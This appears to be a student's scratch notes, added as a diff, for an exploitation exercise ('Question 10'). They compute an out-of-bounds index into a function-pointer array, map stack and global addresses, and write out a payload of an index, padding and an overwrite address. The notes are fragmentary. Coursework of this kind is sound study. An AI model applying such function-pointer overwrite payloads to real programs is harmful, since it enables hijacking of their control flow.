@@ -1,0 +1,70 @@
+1878446740
+
+Question 10:
+	0xbffff130 - 0x804a0d4 = (0xB7FB505C + 64) / sizeof(fptr) = 
+		                 (3086700636 + 64) / 4 = 771675175
+
+wis            return
+0xbffff078 - 0x0804872e = 3086707018
+
+771675175\x00AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x34\x85\x04\x08
+
+
+
+
+=================== HEAP ============================
+
+...
+
+0xbffff53c | tmp       | //fptrs tmp
+0xbffff538 | s         | //int s
+0xbffff534 | p         | //fptr p = pat_on_back
+0xbffff530 | r         | //int r
+0xbffff52f | buf[1023] |
+...
+0xbffff132 | buf[2]    |
+0xbffff131 | buf[1]    | 
+0xbffff130 | buf[0]    |  //char buf[1024]
+
+...
+
+0x804a0dc  | ptrs[2] |
+0x804a0d8  | ptrs[1] |
+0x804a0d4  | ptrs[0] | //fptrs ptrs[3]
+
+...
+
+0x00000000 | stack   |
+=================== ^ STACK ^ =======================
+
+
+
+----------- Attempt 1 -------------------
+
+fptr
+102
+data
+70
+* 0xbffff130
+* 0x804a0d4
+* 0x8048534
+* 0xbffff534
+* 771675416
+* 771675175
+
+3086707018
+
+---------- attempt 2 --------------------
+
+ptrs
+101
+head
+62
+* 0xbffff130
+* 0x804a0d4
+* 0x8048534
+* 0xbffff534
+* 771675416
+* 771675175
+\x34\x85\x04\x08
+3086707018
